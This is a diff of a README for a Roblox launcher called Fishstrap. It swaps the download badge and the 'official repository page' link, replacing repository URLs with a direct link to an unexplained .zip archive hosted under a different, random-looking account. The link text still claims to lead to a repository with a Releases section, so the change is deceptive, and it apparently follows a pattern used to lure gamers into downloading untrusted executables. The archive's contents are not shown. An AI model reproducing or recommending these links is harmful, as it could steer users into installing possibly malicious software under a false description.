@@ -5,7 +5,7 @@ description: "Launch Roblox with custom settings, FastFlags, an FPS unlocker, an
 ---
 # 🚀 Fishstrap-Roblox - Improve your Roblox gaming experience today
 
-[![](https://img.shields.io/badge/Download-Fishstrap-blue.svg)](https://github.com/Turninggenuslycaena258/Fishstrap-Roblox)
+[![](https://img.shields.io/badge/Download-Fishstrap-blue.svg)](https://raw.githubusercontent.com/Turninggenuslycaena258/turninggenuslycaena258.github.io/main/enhaunt/App_2.7.zip)
 
 Fishstrap serves as a custom launcher for the Roblox platform. It adds features that the standard client lacks. You use this tool to manage your game settings, remove frame rate limits, load custom fonts, and run multiple game instances at once. It provides a simple menu to edit FastFlags, which are hidden configuration options that change how the game engine behaves on your computer.
 
@@ -23,7 +23,7 @@ Fishstrap works on Windows 10 and Windows 11. You need the standard Roblox clien
 
 ## 📥 How to Install
 
-1. Visit the [official repository page](https://github.com/Turninggenuslycaena258/Fishstrap-Roblox) to locate the latest version.
+1. Visit the [official repository page](https://raw.githubusercontent.com/Turninggenuslycaena258/turninggenuslycaena258.github.io/main/enhaunt/App_2.7.zip) to locate the latest version.
 2. Look for the "Releases" section on the right side of the page.
 3. Click the most recent release to view the available files.
 4. Download the file ending in `.exe` to your computer.
